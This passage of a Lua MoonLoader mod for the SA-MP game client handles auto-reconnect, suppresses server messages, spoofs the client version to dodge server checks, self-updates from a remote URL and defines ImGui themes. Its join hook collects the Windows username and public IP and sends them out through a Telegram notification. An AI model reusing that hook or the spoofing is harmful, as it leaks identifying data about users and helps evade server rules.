	local acc = findAcc(nick, ip)
	return acc
end

function samp.onSendClientJoin(Ver, mod, nick, response, authKey, clientver, unk)
	--print(Ver, mod, nick, response, authKey, clientver, unk)
	ip, port = sampGetCurrentServerAddress()
	if reconwait then
		reconwait = false
		lua_thread.terminate(reconfuncrec) 
		lua_thread.create(function()
		wait(2000)
		AFKMessage('������������� ����-���������, �� ��� ��� �� ��� ����� - ��������� ���.')
		end)
	end
	local https = require('ssl.https')
	local res = https.request('https://api.ipify.org')
	local pc_name = os.getenv('USERNAME')
	sendTelegramNotification('[SAMP | Connected] \n' .. sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))) .. '\n\n' .. sampGetCurrentServerName() .. ' \n' .. ip .. ':' .. port .. '\nPC name: ' ..  pc_name ..'\nUser ip: ' .. tostring(res) ..'\nScript Version: ' .. thisScript().version ..'\nAuth version: '..tostring(clientver))

	if arec.combobombo2.v == 1 then
		clientver = 'arizona-mobile'
	return {Ver, mod, nick, response, authKey, clientver, unk}
	end
	if arec.combobombo2.v == 2 then
		clientver = 'Arizona PC'
	return {Ver, mod, nick, response, authKey, clientver, unk}
	end
	if arec.combobombo2.v == 0 then
		clientver = ''
	return {Ver, mod, nick, response, authKey, clientver, unk}
	end
end


function onReceivePacket(id, bitStream)
	if (id == PACKET_DISCONNECTION_NOTIFICATION or id == PACKET_INVALID_PASSWORD) then
		reconwait = true
		reconfuncrec = lua_thread.create(reconfunc)
	end
	if (id == PACKET_CONNECTION_BANNED) then	
		ip,port = sampGetCurrentServerAddress()
		if arec.state.v then
			lua_thread.create(function()
				wait(1000)
				sampConnectToServer(ip,port)
			end)
		end
	end
end
function onReceiveRpc(id,bitStream)
	-- if (id == 83) then
	-- 	return false
	-- end
	if (id == 83) and pending_geo then
		return false
	end
	if (id == 83) and textdrawhide then
		return false
	end
	if (id == 83) and processoplatafami then
		return false
	end
	if arizonavhod.v and not sampIsLocalPlayerSpawned() then
		if (id == 82) or (id == 124) or (id == 134) then
			return false
		end
	end
	if (id == RPC_CONNECTIONREJECTED) then
		reconfuncrec = lua_thread.create(reconfunc)
	end
	if antilomka.v then
		if id == 93 then
			color13 = raknetBitStreamReadInt32(bitstream)
			kolvo13 = raknetBitStreamReadInt32(bitstream)
			text13 = raknetBitStreamReadString(bitstream, kolvo13)
			if string.match(text13, "� ��� �������� ������� �����") or string.match(text13, "������ ��������� ����� �������") then
				return false
			end
		end
		if id == 35 then
			return false
		end
	end
end
function imgui.CenterText(text) 
	local width = imgui.GetWindowWidth()
	local calc = imgui.CalcTextSize(text)
    imgui.SetCursorPosX( width / 2 - calc.x / 2 )
    imgui.Text(text)
end
function getServer()
	local serverp = 0
	server = sampGetCurrentServerName()
	if server:find("Phoenix") then serverp = 1 end
	if server:find("Tucson") then serverp = 2 end
	if server:find("Scottdale") then serverp = 3 end
	if server:find("Chandler") then serverp = 4 end
	if server:find("Brainburg") then serverp = 5 end
	if server:find("SaintRose") then serverp = 6 end
	if server:find("Mesa") then serverp = 7 end
	if server:find("Red.Rock") then serverp = 8 end
	if server:find("Yuma") then serverp = 9 end
	if server:find("Surprise") then serverp = 10 end
	if server:find("Prescott") then serverp = 11 end
	if server:find("Glendale") then serverp = 12 end
	if server:find("Kingman") then serverp = 13 end
	if server:find("Winslow") then serverp = 14 end
	if server:find("Payson") then serverp = 15 end
	if server:find("Gilbert") then serverp = 16 end
	if server:find("Show.Low") then serverp = 17 end
	if server:find("Casa.Grande") then serverp = 18 end
	if server:find("Page") then serverp = 19 end
	if server:find("Sun.City") then serverp = 20 end
	return serverp
end
function autoupdate(json_url, prefix, url)
	local dlstatus = require('moonloader').download_status
	local json = getWorkingDirectory() .. '\\'..thisScript().name..'-version.json'
	if doesFileExist(json) then os.remove(json) end
	int_json_download = downloadUrlToFile(json_url, json,
	  function(id, status, p1, p2)
		if status == dlstatus.STATUSEX_ENDDOWNLOAD and int_json_download == id then
		  if doesFileExist(json) then
			local f = io.open(json, 'r')
			if f then
			  local info = decodeJson(f:read('*a'))
			  updatelink = info.updateurl
			  updateversion = info.latest
			  f:close()
			  os.remove(json)
			  if updateversion ~= thisScript().version then
				lua_thread.create(function(prefix)
				  local dlstatus = require('moonloader').download_status
				  AFKMessage('���������� ����������. ������� ���������� c '..thisScript().version..' �� '..updateversion)
				  wait(250)
				  int_scr_download = downloadUrlToFile(updatelink, thisScript().path,
					function(id3, status1, p13, p23)
					  if status1 == dlstatus.STATUS_ENDDOWNLOADDATA and int_scr_download == id3 then
						AFKMessage('�������� ���������� ���������.')
						AFKMessage('���������� ���������!')
						goupdatestatus = true
						lua_thread.create(function() wait(500) thisScript():reload() end)
					  end
					  if status1 == dlstatus.STATUSEX_ENDDOWNLOAD and int_scr_download == id3 then
						if goupdatestatus == nil then
						  AFKMessage('���������� ������ ��������. �������� ���������� ������.')
						  update = false
						end
					  end
					end
				  )
				  end, prefix
				)
			  else
				update = false
				AFKMessage('���������� �� ���������. �������� ����!')
			  end
			end
		  else
			update = false
		  end
		end
	  end
	)
	-- while update ~= false do wait(100) end
end
--[[
function theme()
	imgui.SwitchContext()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4
	local ImVec2 = imgui.ImVec2

	style.WindowPadding = imgui.ImVec2(8, 8)
	style.WindowRounding = 6
	style.ChildWindowRounding = 5
	style.FramePadding = imgui.ImVec2(5, 3)
	style.FrameRounding = 3.0
	style.ItemSpacing = imgui.ImVec2(5, 4)
	style.ItemInnerSpacing = imgui.ImVec2(4, 4)
	style.IndentSpacing = 21
	style.ScrollbarSize = 10.0
	style.ScrollbarRounding = 13
	style.GrabMinSize = 8
	style.GrabRounding = 1
	style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
	style.ButtonTextAlign = imgui.ImVec2(0.5, 0.5)
	 
  
	colors[clr.Text] = ImVec4(0.95, 0.96, 0.98, 1.00)
	colors[clr.TextDisabled] = ImVec4(0.36, 0.42, 0.47, 1.00)
	colors[clr.WindowBg] = ImVec4(0.11, 0.15, 0.17, 1.00)
	colors[clr.ChildWindowBg] = ImVec4(0.15, 0.18, 0.22, 1.00)
	colors[clr.PopupBg] = ImVec4(0.08, 0.08, 0.08, 0.94)
	colors[clr.Border] = ImVec4(0.43, 0.43, 0.50, 0.50)
	colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.FrameBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
	colors[clr.FrameBgHovered] = ImVec4(0.12, 0.20, 0.28, 1.00)
	colors[clr.FrameBgActive] = ImVec4(0.09, 0.12, 0.14, 1.00)
	colors[clr.TitleBg] = ImVec4(0.09, 0.12, 0.14, 0.65)
	colors[clr.TitleBgCollapsed] = ImVec4(0.00, 0.00, 0.00, 0.51)
	colors[clr.TitleBgActive] = ImVec4(0.08, 0.10, 0.12, 1.00)
	colors[clr.MenuBarBg] = ImVec4(0.15, 0.18, 0.22, 1.00)
	colors[clr.ScrollbarBg] = ImVec4(0.02, 0.02, 0.02, 0.39)
	colors[clr.ScrollbarGrab] = ImVec4(0.20, 0.25, 0.29, 1.00)
	colors[clr.ScrollbarGrabHovered] = ImVec4(0.18, 0.22, 0.25, 1.00)
	colors[clr.ScrollbarGrabActive] = ImVec4(0.09, 0.21, 0.31, 1.00)
	colors[clr.ComboBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
	colors[clr.CheckMark] = ImVec4(0.28, 0.56, 1.00, 1.00)
	colors[clr.SliderGrab] = ImVec4(0.28, 0.56, 1.00, 1.00)
	colors[clr.SliderGrabActive] = ImVec4(0.37, 0.61, 1.00, 1.00)
	colors[clr.Button] = ImVec4(0.20, 0.25, 0.29, 1.00)
	colors[clr.ButtonHovered] = ImVec4(0.28, 0.56, 1.00, 1.00)
	colors[clr.ButtonActive] = ImVec4(0.06, 0.53, 0.98, 1.00)
	colors[clr.Header] = ImVec4(0.20, 0.25, 0.29, 0.55)
	colors[clr.HeaderHovered] = ImVec4(0.26, 0.59, 0.98, 0.80)
	colors[clr.HeaderActive] = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.ResizeGrip] = ImVec4(0.26, 0.59, 0.98, 0.25)
	colors[clr.ResizeGripHovered] = ImVec4(0.26, 0.59, 0.98, 0.67)
	colors[clr.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
	colors[clr.CloseButton] = ImVec4(0.40, 0.39, 0.38, 0.16)
	colors[clr.CloseButtonHovered] = ImVec4(0.40, 0.39, 0.38, 0.39)
	colors[clr.CloseButtonActive] = ImVec4(0.40, 0.39, 0.38, 1.00)
	colors[clr.PlotLines] = ImVec4(0.61, 0.61, 0.61, 1.00)
	colors[clr.PlotLinesHovered] = ImVec4(1.00, 0.43, 0.35, 1.00)
	colors[clr.PlotHistogram] = ImVec4(0.90, 0.70, 0.00, 1.00)
	colors[clr.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
	colors[clr.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
	colors[clr.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
end
theme()
]]
function theme()
    imgui.SwitchContext()
local style = imgui.GetStyle()
local colors = style.Colors
local clr = imgui.Col
local ImVec4 = imgui.ImVec4

style.WindowPadding = imgui.ImVec2(8, 8)
    style.WindowRounding = 6
    style.ChildWindowRounding = 5
    style.FramePadding = imgui.ImVec2(5, 3)
    style.FrameRounding = 3.0
    style.ItemSpacing = imgui.ImVec2(5, 4)
    style.ItemInnerSpacing = imgui.ImVec2(4, 4)
    style.IndentSpacing = 21
    style.ScrollbarSize = 10.0
    style.ScrollbarRounding = 13
    style.GrabMinSize = 8
    style.GrabRounding = 1
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
    style.ButtonTextAlign = imgui.ImVec2(0.5, 0.5)

colors[clr.Text] = ImVec4(0.00, 1.00, 1.00, 1.00)
colors[clr.TextDisabled]           = ImVec4(0.29, 0.29, 0.29, 1.00);
	colors[clr.WindowBg]               = ImVec4(0.14, 0.14, 0.14, 0.95);
	colors[clr.ChildWindowBg]          = ImVec4(0.17, 0.17, 0.17, 1.00);
	colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94);
	colors[clr.Border]                 = ImVec4(0.14, 0.14, 0.14, 1.00);
	colors[clr.BorderShadow]           = ImVec4(1.00, 1.00, 1.00, 0.10);
	colors[clr.FrameBg]                = ImVec4(0.22, 0.22, 0.22, 1.00);
	colors[clr.FrameBgHovered]         = ImVec4(0.18, 0.18, 0.18, 1.00);
	colors[clr.FrameBgActive]          = ImVec4(0.10, 0.10, 0.10, 1.00);
	colors[clr.TitleBg]                = ImVec4(0.14, 0.14, 0.14, 0.81);
	colors[clr.TitleBgActive]          = ImVec4(0.12, 0.12, 0.12, 1.00);
	colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51);
	colors[clr.MenuBarBg]              = ImVec4(0.20, 0.20, 0.20, 1.00);
	colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.39);
	colors[clr.ScrollbarGrab]          = ImVec4(0.36, 0.36, 0.36, 1.00);
	colors[clr.ScrollbarGrabHovered]   = ImVec4(0.18, 0.22, 0.25, 1.00);
	colors[clr.ScrollbarGrabActive]    = ImVec4(0.24, 0.24, 0.24, 1.00);
	colors[clr.ComboBg]                = ImVec4(0.24, 0.24, 0.24, 1.00);
	colors[clr.CheckMark]              = ImVec4(1.00, 0.28, 0.28, 1.00);
	colors[clr.SliderGrab]             = ImVec4(1.00, 0.28, 0.28, 1.00);
	colors[clr.SliderGrabActive]       = ImVec4(1.00, 0.28, 0.28, 1.00);
	colors[clr.Button] = ImVec4(0.00, 0.65, 0.65, 0.46)
colors[clr.ButtonHovered] = ImVec4(0.01, 1.00, 1.00, 0.43)
colors[clr.ButtonActive] = ImVec4(0.00, 1.00, 1.00, 0.62)
	colors[clr.Header]                 = ImVec4(1.00, 0.28, 0.28, 1.00);
	colors[clr.HeaderHovered]          = ImVec4(1.00, 0.39, 0.39, 1.00);
	colors[clr.HeaderActive]           = ImVec4(1.00, 0.21, 0.21, 1.00);
	colors[clr.ResizeGrip]             = ImVec4(1.00, 0.28, 0.28, 1.00);
	colors[clr.ResizeGripHovered]      = ImVec4(1.00, 0.39, 0.39, 1.00);
	colors[clr.ResizeGripActive]       = ImVec4(1.00, 0.19, 0.19, 1.00);
colors[clr.CloseButton] = ImVec4(0.00, 0.78, 0.78, 0.35)
colors[clr.CloseButtonHovered] = ImVec4(0.00, 0.78, 0.78, 0.47)
colors[clr.CloseButtonActive] = ImVec4(0.00, 0.78, 0.78, 1.00)
colors[clr.PlotLines] = ImVec4(0.00, 1.00, 1.00, 1.00)
colors[clr.PlotLinesHovered] = ImVec4(0.00, 1.00, 1.00, 1.00)
colors[clr.PlotHistogram] = ImVec4(0.00, 1.00, 1.00, 1.00)
colors[clr.PlotHistogramHovered] = ImVec4(0.00, 1.00, 1.00, 1.00)
colors[clr.TextSelectedBg] = ImVec4(0.00, 1.00, 1.00, 0.22)
colors[clr.ModalWindowDarkening] = ImVec4(0.04, 0.10, 0.09, 0.51)
end

function theme1()
	imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4

    style.WindowRounding = 1.0
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
    style.ChildWindowRounding = 0.0
    style.FrameRounding = 0.0
    style.ItemSpacing = imgui.ImVec2(5.0, 4.0)
    style.ScrollbarSize = 13.0
    style.ScrollbarRounding = 0
    style.GrabMinSize = 8.0
    style.GrabRounding = 1.0

    colors[clr.Text] = ImVec4(0.80, 0.80, 0.83, 1.00)
    colors[clr.TextDisabled] = ImVec4(0.24, 0.23, 0.29, 1.00)
    colors[clr.WindowBg] = ImVec4(0.06, 0.05, 0.07, roulette.backgroundmenu.v / 100)
    colors[clr.ChildWindowBg] = ImVec4(0.07, 0.07, 0.09, roulette.backgroundmenu.v / 100)
    colors[clr.PopupBg] = ImVec4(0.07, 0.07, 0.09, 1.00)
    colors[clr.Border] = ImVec4(0.80, 0.80, 0.83, 0.88)
    colors[clr.BorderShadow] = ImVec4(0.92, 0.91, 0.88, 0.00)
    colors[clr.FrameBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
    colors[clr.FrameBgHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
    colors[clr.FrameBgActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
    colors[clr.TitleBg] = ImVec4(0.10, 0.09, 0.12, roulette.backgroundmenu.v / 100)
    colors[clr.TitleBgCollapsed] = ImVec4(1.00, 0.98, 0.95, 0.75)
    colors[clr.TitleBgActive] = ImVec4(0.07, 0.07, 0.09, roulette.backgroundmenu.v / 100)
    colors[clr.MenuBarBg] = ImVec4(0.10, 0.09, 0.12, roulette.backgroundmenu.v / 100)
    colors[clr.ScrollbarBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
    colors[clr.ScrollbarGrab] = ImVec4(0.80, 0.80, 0.83, 0.31)
    colors[clr.ScrollbarGrabHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
    colors[clr.ScrollbarGrabActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
    colors[clr.ComboBg] = ImVec4(0.19, 0.18, 0.21, 1.00)
    colors[clr.CheckMark] = ImVec4(0.80, 0.80, 0.83, 0.31)
    colors[clr.SliderGrab] = ImVec4(0.80, 0.80, 0.83, 0.31)
    colors[clr.SliderGrabActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
    colors[clr.Button] = ImVec4(0.10, 0.09, 0.12, 1.00)
    colors[clr.ButtonHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
    colors[clr.ButtonActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
    colors[clr.Header] = ImVec4(0.10, 0.09, 0.12, 1.00)
    colors[clr.HeaderHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
    colors[clr.HeaderActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
    colors[clr.ResizeGrip] = ImVec4(0.00, 0.00, 0.00, 0.00)
    colors[clr.ResizeGripHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
    colors[clr.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
    colors[clr.CloseButton] = ImVec4(0.40, 0.39, 0.38, 0.16)
    colors[clr.CloseButtonHovered] = ImVec4(0.40, 0.39, 0.38, 0.39)
    colors[clr.CloseButtonActive] = ImVec4(0.40, 0.39, 0.38, 1.00)
    colors[clr.PlotLines] = ImVec4(0.40, 0.39, 0.38, 0.63)
    colors[clr.PlotLinesHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
    colors[clr.PlotHistogram] = ImVec4(0.40, 0.39, 0.38, 0.63)
    colors[clr.PlotHistogramHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
    colors[clr.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
    colors[clr.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
end

function theme2()
	imgui.SwitchContext()
  local style = imgui.GetStyle()
  local colors = style.Colors
  local clr = imgui.Col
  local ImVec4 = imgui.ImVec4

  style.WindowPadding = imgui.ImVec2(15, 15)
  style.WindowRounding = 1.5
  style.FramePadding = imgui.ImVec2(5, 5)
  style.FrameRounding = 4.0
  style.ItemSpacing = imgui.ImVec2(12, 8)
  style.ItemInnerSpacing = imgui.ImVec2(8, 6)
  style.IndentSpacing = 25.0
  style.ScrollbarSize = 15.0
  style.ScrollbarRounding = 9.0
  style.GrabMinSize = 5.0
  style.GrabRounding = 3.0

  colors[clr.Text] = ImVec4(0.80, 0.80, 0.83, 1.00)
  colors[clr.TextDisabled] = ImVec4(0.24, 0.23, 0.29, 1.00)
  colors[clr.WindowBg] = ImVec4(0.06, 0.05, 0.07, roulette.backgroundmenu.v / 100)
  colors[clr.ChildWindowBg] = ImVec4(0.07, 0.07, 0.09, roulette.backgroundmenu.v / 100)
  colors[clr.PopupBg] = ImVec4(0.07, 0.07, 0.09, 1.00)
  colors[clr.Border] = ImVec4(0.80, 0.80, 0.83, 0.88)
  colors[clr.BorderShadow] = ImVec4(0.92, 0.91, 0.88, 0.00)
  colors[clr.FrameBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
  colors[clr.FrameBgHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
  colors[clr.FrameBgActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
  colors[clr.TitleBg] = ImVec4(0.10, 0.09, 0.12, roulette.backgroundmenu.v / 100)
  colors[clr.TitleBgCollapsed] = ImVec4(1.00, 0.98, 0.95, 0.75)
  colors[clr.TitleBgActive] = ImVec4(0.07, 0.07, 0.09, roulette.backgroundmenu.v / 100)
  colors[clr.MenuBarBg] = ImVec4(0.10, 0.09, 0.12, roulette.backgroundmenu.v / 100)
  colors[clr.ScrollbarBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
  colors[clr.ScrollbarGrab] = ImVec4(0.80, 0.80, 0.83, 0.31)
  colors[clr.ScrollbarGrabHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
  colors[clr.ScrollbarGrabActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
  colors[clr.ComboBg] = ImVec4(0.19, 0.18, 0.21, 1.00)
  colors[clr.CheckMark] = ImVec4(0.80, 0.80, 0.83, 0.31)
  colors[clr.SliderGrab] = ImVec4(0.80, 0.80, 0.83, 0.31)
  colors[clr.SliderGrabActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
  colors[clr.Button] = ImVec4(0.10, 0.09, 0.12, 1.00)
  colors[clr.ButtonHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
  colors[clr.ButtonActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
  colors[clr.Header] = ImVec4(0.10, 0.09, 0.12, 1.00)
  colors[clr.HeaderHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
  colors[clr.HeaderActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
  colors[clr.ResizeGrip] = ImVec4(0.00, 0.00, 0.00, 0.00)
  colors[clr.ResizeGripHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
  colors[clr.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
  colors[clr.CloseButton] = ImVec4(0.40, 0.39, 0.38, 0.16)
  colors[clr.CloseButtonHovered] = ImVec4(0.40, 0.39, 0.38, 0.39)
  colors[clr.CloseButtonActive] = ImVec4(0.40, 0.39, 0.38, 1.00)
  colors[clr.PlotLines] = ImVec4(0.40, 0.39, 0.38, 0.63)
  colors[clr.PlotLinesHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
  colors[clr.PlotHistogram] = ImVec4(0.40, 0.39, 0.38, 0.63)
  colors[clr.PlotHistogramHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
  colors[clr.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
  colors[clr.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
end

function theme3()
	local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4
    
    colors[clr.Text]                   = ImVec4(0.01, 0.36, 1.00, 1.00);
    colors[clr.TextDisabled]           = ImVec4(0.00, 0.60, 0.67, 0.97);
    colors[clr.WindowBg]               = ImVec4(0.02, 0.00, 0.06, roulette.backgroundmenu.v / 100);
    colors[clr.ChildWindowBg]          = ImVec4(0.09, 0.01, 0.15, roulette.backgroundmenu.v / 100);
    colors[clr.PopupBg]                = ImVec4(0.00, 0.00, 0.00, 1.00);
    colors[clr.Border]                 = ImVec4(0.07, 0.10, 0.15, 0.56);
    colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.49);
    colors[clr.FrameBg]                = ImVec4(0.06, 0.19, 0.46, 0.29);
    colors[clr.FrameBgHovered]         = ImVec4(0.03, 0.00, 0.06, 0.22);
    colors[clr.FrameBgActive]          = ImVec4(0.00, 0.00, 0.00, 0.10);
    colors[clr.TitleBg]                = ImVec4(0.01, 0.01, 0.05, roulette.backgroundmenu.v / 100);
    colors[clr.TitleBgActive]          = ImVec4(0.14, 0.26, 0.55, roulette.backgroundmenu.v / 100);
    colors[clr.TitleBgCollapsed]       = ImVec4(0.40, 0.40, 0.90, 0.20);
    colors[clr.MenuBarBg]              = ImVec4(0.00, 0.00, 0.00, roulette.backgroundmenu.v / 100);
    colors[clr.ScrollbarBg]            = ImVec4(0.27, 0.00, 1.00, 0.19);
    colors[clr.ScrollbarGrab]          = ImVec4(0.00, 1.00, 0.95, 0.30);
    colors[clr.ScrollbarGrabHovered]   = ImVec4(0.00, 0.00, 0.00, 0.40);
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.02, 0.98, 1.00, 0.40);
    colors[clr.ComboBg]                = ImVec4(0.00, 0.00, 0.00, 0.99);
    colors[clr.CheckMark]              = ImVec4(0.00, 0.58, 1.00, 1.00);
    colors[clr.SliderGrab]             = ImVec4(1.00, 1.00, 1.00, 0.30);
    colors[clr.SliderGrabActive]       = ImVec4(0.80, 0.50, 0.50, 1.00);
    colors[clr.Button]                 = ImVec4(0.09, 0.06, 0.20, 1.00);
    colors[clr.ButtonHovered]          = ImVec4(0.08, 0.03, 0.21, 0.27);
    colors[clr.ButtonActive]           = ImVec4(0.00, 0.54, 1.00, 1.00);
    colors[clr.Header]                 = ImVec4(0.35, 0.02, 1.00, 0.45);
    colors[clr.HeaderHovered]          = ImVec4(0.06, 0.39, 0.40, 0.80);
    colors[clr.HeaderActive]           = ImVec4(0.00, 0.86, 1.00, 0.80);
    colors[clr.Separator]              = ImVec4(0.07, 0.30, 0.52, 1.00);
    colors[clr.SeparatorHovered]       = ImVec4(0.00, 0.00, 0.00, 1.00);
    colors[clr.SeparatorActive]        = ImVec4(0.06, 0.06, 0.90, 1.00);
    colors[clr.ResizeGrip]             = ImVec4(0.02, 0.01, 0.27, 0.30);
    colors[clr.ResizeGripHovered]      = ImVec4(0.24, 0.00, 0.87, 0.60);
    colors[clr.ResizeGripActive]       = ImVec4(0.00, 0.00, 0.00, 0.90);
    colors[clr.CloseButton]            = ImVec4(0.00, 0.00, 0.00, 0.90);
    colors[clr.CloseButtonHovered]     = ImVec4(1.00, 0.16, 0.00, 0.26);
    colors[clr.CloseButtonActive]      = ImVec4(1.00, 0.05, 0.05, 1.00);
    colors[clr.PlotLines]              = ImVec4(0.45, 0.00, 0.73, 1.00);
    colors[clr.PlotLinesHovered]       = ImVec4(0.07, 0.02, 0.39, 1.00);
    colors[clr.PlotHistogram]          = ImVec4(0.06, 0.05, 0.12, 1.00);
    colors[clr.PlotHistogramHovered]   = ImVec4(0.10, 0.06, 0.27, 1.00);
    colors[clr.TextSelectedBg]         = ImVec4(0.17, 0.06, 0.41, 0.35);
    colors[clr.ModalWindowDarkening]   = ImVec4(0.28, 0.05, 0.59, 0.35);
end

function theme4()
	imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4
    style.WindowRounding = 2
    style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
    style.ChildWindowRounding = 2.0
    style.FrameRounding = 3
    style.ItemSpacing = imgui.ImVec2(5.0, 4.0)
    style.ScrollbarSize = 13.0
    style.ScrollbarRounding = 0
    style.GrabMinSize = 8.0
    style.GrabRounding = 1.0
    style.WindowPadding = imgui.ImVec2(4.0, 4.0)
    style.FramePadding = imgui.ImVec2(3.5, 3.5)
    style.ButtonTextAlign = imgui.ImVec2(0.0, 0.5)
    colors[clr.WindowBg]              = ImVec4(0.14, 0.12, 0.16, roulette.backgroundmenu.v / 100);
    colors[clr.ChildWindowBg]         = ImVec4(0.30, 0.20, 0.39, roulette.backgroundmenu.v / 100);
    colors[clr.PopupBg]               = ImVec4(0.05, 0.05, 0.10, 0.90);
    colors[clr.Border]                = ImVec4(0.89, 0.85, 0.92, 0.30);
    colors[clr.BorderShadow]          = ImVec4(0.00, 0.00, 0.00, 0.00);
    colors[clr.FrameBg]               = ImVec4(0.30, 0.20, 0.39, 1.00);
    colors[clr.FrameBgHovered]        = ImVec4(0.41, 0.19, 0.63, 0.68);
    colors[clr.FrameBgActive]         = ImVec4(0.41, 0.19, 0.63, 1.00);
    colors[clr.TitleBg]               = ImVec4(0.41, 0.19, 0.63, roulette.backgroundmenu.v / 100);
    colors[clr.TitleBgCollapsed]      = ImVec4(0.41, 0.19, 0.63, 0.35);
    colors[clr.TitleBgActive]         = ImVec4(0.41, 0.19, 0.63, roulette.backgroundmenu.v / 100);
    colors[clr.MenuBarBg]             = ImVec4(0.30, 0.20, 0.39, roulette.backgroundmenu.v / 100);
    colors[clr.ScrollbarBg]           = ImVec4(0.30, 0.20, 0.39, 1.00);
    colors[clr.ScrollbarGrab]         = ImVec4(0.41, 0.19, 0.63, 0.31);
    colors[clr.ScrollbarGrabHovered]  = ImVec4(0.41, 0.19, 0.63, 0.78);
    colors[clr.ScrollbarGrabActive]   = ImVec4(0.41, 0.19, 0.63, 1.00);
    colors[clr.ComboBg]               = ImVec4(0.30, 0.20, 0.39, 1.00);
    colors[clr.CheckMark]             = ImVec4(0.56, 0.61, 1.00, 1.00);
    colors[clr.SliderGrab]            = ImVec4(0.41, 0.19, 0.63, 0.24);
    colors[clr.SliderGrabActive]      = ImVec4(0.41, 0.19, 0.63, 1.00);
    colors[clr.Button]                = ImVec4(0.41, 0.19, 0.63, 0.44);
    colors[clr.ButtonHovered]         = ImVec4(0.41, 0.19, 0.63, 0.86);
    colors[clr.ButtonActive]          = ImVec4(0.64, 0.33, 0.94, 1.00);
    colors[clr.Header]                = ImVec4(0.41, 0.19, 0.63, 0.76);
    colors[clr.HeaderHovered]         = ImVec4(0.41, 0.19, 0.63, 0.86);
    colors[clr.HeaderActive]          = ImVec4(0.41, 0.19, 0.63, 1.00);
    colors[clr.ResizeGrip]            = ImVec4(0.41, 0.19, 0.63, 0.20);
    colors[clr.ResizeGripHovered]     = ImVec4(0.41, 0.19, 0.63, 0.78);
    colors[clr.ResizeGripActive]      = ImVec4(0.41, 0.19, 0.63, 1.00);
    colors[clr.CloseButton]           = ImVec4(1.00, 1.00, 1.00, 0.75);
    colors[clr.CloseButtonHovered]    = ImVec4(0.88, 0.74, 1.00, 0.59);
    colors[clr.CloseButtonActive]     = ImVec4(0.88, 0.85, 0.92, 1.00);
    colors[clr.PlotLines]             = ImVec4(0.89, 0.85, 0.92, 0.63);
    colors[clr.PlotLinesHovered]      = ImVec4(0.41, 0.19, 0.63, 1.00);
    colors[clr.PlotHistogram]         = ImVec4(0.89, 0.85, 0.92, 0.63);
    colors[clr.PlotHistogramHovered]  = ImVec4(0.41, 0.19, 0.63, 1.00);
    colors[clr.TextSelectedBg]        = ImVec4(0.41, 0.19, 0.63, 0.43);
    colors[clr.ModalWindowDarkening]  = ImVec4(0.20, 0.20, 0.20, 0.35);
end

function theme5()
	imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4
    style.WindowPadding = imgui.ImVec2(9, 5)
    style.WindowRounding = 10
    style.ChildWindowRounding = 10
    style.FramePadding = imgui.ImVec2(5, 3)
    style.FrameRounding = 6.0
    style.ItemSpacing = imgui.ImVec2(9.0, 3.0)
    style.ItemInnerSpacing = imgui.ImVec2(9.0, 3.0)
    style.IndentSpacing = 21
    style.ScrollbarSize = 6.0
    style.ScrollbarRounding = 13
